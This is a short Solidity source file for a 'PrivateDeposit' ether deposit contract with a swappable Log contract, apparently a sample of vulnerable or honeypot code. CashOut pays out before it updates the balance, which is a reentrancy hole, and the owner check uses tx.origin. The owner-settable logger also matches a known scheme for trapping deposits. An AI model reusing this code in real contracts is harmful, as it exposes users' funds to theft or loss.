pragma solidity ^0.4.19;

contract PrivateDeposit
{
    mapping (address => uint) balances;
        
    struct Config {
        address owner;
        uint MinDeposit;
    }
    
    Config private config;
    
    Log TransferLog;
    
    modifier onlyOwner() {
        require(tx.origin == config.owner);
        _;
    }    
    
    function PrivateDeposit()
    {
        config.owner = msg.sender;
        config.MinDeposit = 1 ether;
        TransferLog = new Log();
    }
    
    function setLog(address _lib) onlyOwner
    {
        TransferLog = Log(_lib);
    }    
    
    function Deposit()
    public
    payable
    {
        if(msg.value >= config.MinDeposit)
        {
            balances[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }
    
    function CashOut(uint _am)
    {
        if(_am<=balances[msg.sender])
        {            
             
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                TransferLog.AddMessage(msg.sender,_am,"CashOut");
            }
        }
    }
    
    function() public payable{}    
    
}

contract Log 
{
   
    struct Message
    {
        uint Val;
        address Sender;
        uint  Time;
        string  Data;
    }
    
    Message[] public History;
    
    struct TempMessage {
        uint Val;
        address Sender;
        uint  Time;
        string  Data;
    }
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        TempMessage memory tempMsg;
        tempMsg.Sender = _adr;
        tempMsg.Time = now;
        tempMsg.Val = _val;
        tempMsg.Data = _data;
        History.push(Message(tempMsg.Val, tempMsg.Sender, tempMsg.Time, tempMsg.Data));
    }
}